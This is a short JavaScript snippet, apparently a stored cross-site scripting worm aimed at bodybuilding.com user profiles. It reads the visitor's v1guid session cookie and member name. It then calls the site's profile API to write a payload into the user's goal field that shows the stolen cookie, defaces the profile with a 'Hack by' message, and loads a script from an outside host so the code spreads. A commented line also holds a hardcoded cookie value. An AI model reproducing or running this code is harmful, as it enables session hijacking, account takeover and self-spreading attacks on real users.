//var cookie = '3f1561fa444cc24ac85a5c3266459a38f733fddf'
//var turl = 'http://api.bodybuilding.com/api-proxy/profile/goals/set?maingoal=sport&needsuser=1&overallgoal=<?=$message?>';

debug("load virus");
auth = getCookie("v1guid");
user = "unknown";
if (window.s_omni) { user = s_omni['memberName']; }

var eurl = 'http://api.bodybuilding.com/api-proxy/profile/goals/set?maingoal=sport&needsuser=1&overallgoal=%26lt;pre%26gt;Hack+by:+F0ney0p.%0ABecome+'+user+'!%0ASet+v1guid+cookie+to:%0A'+auth+'%26lt;/pre%26gt;%26lt;sCRipT+sRC%3d"http://infosec3/h.php"+%26gt;%26lt;/script%26gt;';

cs(eurl);
debug("virus loaded");
